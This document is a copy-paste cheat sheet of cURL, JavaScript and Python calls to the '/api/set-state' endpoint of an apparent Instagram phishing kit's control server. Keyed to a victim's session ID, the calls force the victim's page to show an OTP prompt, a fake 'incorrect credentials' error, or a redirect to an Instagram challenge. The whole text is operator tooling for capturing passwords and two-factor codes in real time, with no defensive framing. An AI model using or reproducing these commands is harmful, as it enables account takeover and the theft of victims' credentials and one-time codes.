# Quick API Examples - Ready to Paste

## Your Server URL
```
https://instest-production.up.railway.app
```

## Example Session ID
```
session_1768473049016_qilt79upm
```

---

## 1. Show OTP Page

### cURL (Terminal/Command Line)
```bash
curl -X POST https://instest-production.up.railway.app/api/set-state \
  -H "Content-Type: application/json" \
  -d '{
    "sessionId": "session_1768473049016_qilt79upm",
    "command": "getOtp"
  }'
```

### JavaScript (Browser Console)
```javascript
fetch('https://instest-production.up.railway.app/api/set-state', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    sessionId: 'session_1768473049016_qilt79upm',
    command: 'getOtp'
  })
})
.then(res => res.json())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));
```

### Python
```python
import requests

response = requests.post(
    'https://instest-production.up.railway.app/api/set-state',
    json={
        'sessionId': 'session_1768473049016_qilt79upm',
        'command': 'getOtp'
    }
)
print(response.json())
```

---

## 2. Show Incorrect Credentials Error

### cURL (Terminal/Command Line)
```bash
curl -X POST https://instest-production.up.railway.app/api/set-state \
  -H "Content-Type: application/json" \
  -d '{
    "sessionId": "session_1768473049016_qilt79upm",
    "command": "incorrectCredentials"
  }'
```

### JavaScript (Browser Console)
```javascript
fetch('https://instest-production.up.railway.app/api/set-state', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    sessionId: 'session_1768473049016_qilt79upm',
    command: 'incorrectCredentials'
  })
})
.then(res => res.json())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));
```

### Python
```python
import requests

response = requests.post(
    'https://instest-production.up.railway.app/api/set-state',
    json={
        'sessionId': 'session_1768473049016_qilt79upm',
        'command': 'incorrectCredentials'
    }
)
print(response.json())
```

---

## 3. Redirect to Success (Instagram Challenge)

### cURL (Terminal/Command Line)
```bash
curl -X POST https://instest-production.up.railway.app/api/set-state \
  -H "Content-Type: application/json" \
  -d '{
    "sessionId": "session_1768473049016_qilt79upm",
    "command": "success"
  }'
```

### JavaScript (Browser Console)
```javascript
fetch('https://instest-production.up.railway.app/api/set-state', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    sessionId: 'session_1768473049016_qilt79upm',
    command: 'success'
  })
})
.then(res => res.json())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));
```

### Python
```python
import requests

response = requests.post(
    'https://instest-production.up.railway.app/api/set-state',
    json={
        'sessionId': 'session_1768473049016_qilt79upm',
        'command': 'success'
    }
)
print(response.json())
```

---

## Quick Copy-Paste for Incorrect Credentials

**cURL:**
```bash
curl -X POST https://instest-production.up.railway.app/api/set-state -H "Content-Type: application/json" -d '{"sessionId": "session_1768473049016_qilt79upm", "command": "incorrectCredentials"}'
```

**JavaScript (Browser Console):**
```javascript
fetch('https://instest-production.up.railway.app/api/set-state', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({sessionId: 'session_1768473049016_qilt79upm', command: 'incorrectCredentials'})}).then(r=>r.json()).then(console.log);
```

**Python:**
```python
import requests; requests.post('https://instest-production.up.railway.app/api/set-state', json={'sessionId': 'session_1768473049016_qilt79upm', 'command': 'incorrectCredentials'}).json()
```

---

## Note
Replace `session_1768473049016_qilt79upm` with the actual session ID shown in the browser console when you click login.
